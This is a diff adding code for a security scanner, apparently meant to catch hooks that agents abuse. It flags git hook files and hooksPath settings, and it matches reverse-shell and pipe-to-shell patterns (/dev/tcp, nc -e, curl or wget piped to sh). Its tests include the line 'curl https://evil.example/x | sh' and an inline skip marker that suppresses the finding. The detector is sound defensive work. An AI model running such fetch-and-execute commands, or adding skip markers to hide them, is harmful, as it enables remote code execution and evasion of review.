@@ -1,0 +1,90 @@
+-- AISB 2.1 detectors: agent / hook / shell primitives (v1 subset).
+
+use finding { Finding, Severity, make_finding, has_skip, concat_findings }
+use lacan_shim {
+    re_find_line, str_contains, path_basename, str_ends_with
+}
+
+pub ais001(path, text) -> vec<Finding> = {
+    out := new()
+    if has_skip(text, "AIS001") {
+        out
+    } else {
+        -- Match real .git/hooks and fixture path .../dot-git/hooks/ (git cannot track nested .git).
+        if str_contains(path, "/.git/hooks/") || str_contains(path, "/dot-git/hooks/") {
+            base := path_basename(path)
+            if !str_ends_with(base, ".sample") {
+                push(out, make_finding(
+                    "AIS001",
+                    Severity.High,
+                    "2.1",
+                    "AML.T0010.000",
+                    path,
+                    1,
+                    "Git hook file present: " ++ base
+                ))
+            }
+        }
+        if str_contains(path, ".git/config") || str_contains(path, "/dot-git/config") {
+            line := re_find_line("(?i)hooksPath\\s*=", text)
+            if line > 0 {
+                push(out, make_finding(
+                    "AIS001",
+                    Severity.High,
+                    "2.1",
+                    "AML.T0010.000",
+                    path,
+                    line,
+                    "core.hooksPath is set in .git/config"
+                ))
+            }
+        }
+        out
+    }
+}
+
+pub ais008(path, text) -> vec<Finding> = {
+    out := new()
+    if has_skip(text, "AIS008") {
+        out
+    } else {
+        patterns := new()
+        push(patterns, "/dev/tcp/")
+        push(patterns, "nc -e")
+        push(patterns, "ncat -e")
+        push(patterns, "curl[^\\n]*\\|\\s*(ba)?sh")
+        push(patterns, "wget[^\\n]*\\|\\s*(ba)?sh")
+        i mut:= 0
+        while i < len(patterns) {
+            pat := patterns[i]
+            line := re_find_line(pat, text)
+            if line > 0 {
+                push(out, make_finding(
+                    "AIS008",
+                    Severity.High,
+                    "2.1",
+                    "AML.T0010.000",
+                    path,
+                    line,
+                    "Reverse-shell or pipe-to-shell primitive matched"
+                ))
+            }
+            i = i + 1
+        }
+        out
+    }
+}
+
+pub scan_agent(path, text) -> vec<Finding> = {
+    concat_findings(ais001(path, text), ais008(path, text))
+}
+
+test "ais008 matches curl pipe sh" = {
+    fs := ais008("scripts/setup.sh", "curl https://evil.example/x | sh\n")
+    assert_eq(len(fs) > 0, true)
+}
+
+test "ais008 respects skip" = {
+    fs := ais008("scripts/setup.sh", "# lacan:skip=AIS008:intentional\ncurl https://evil.example/x | sh\n")
+    assert_eq(len(fs), 0)
+}
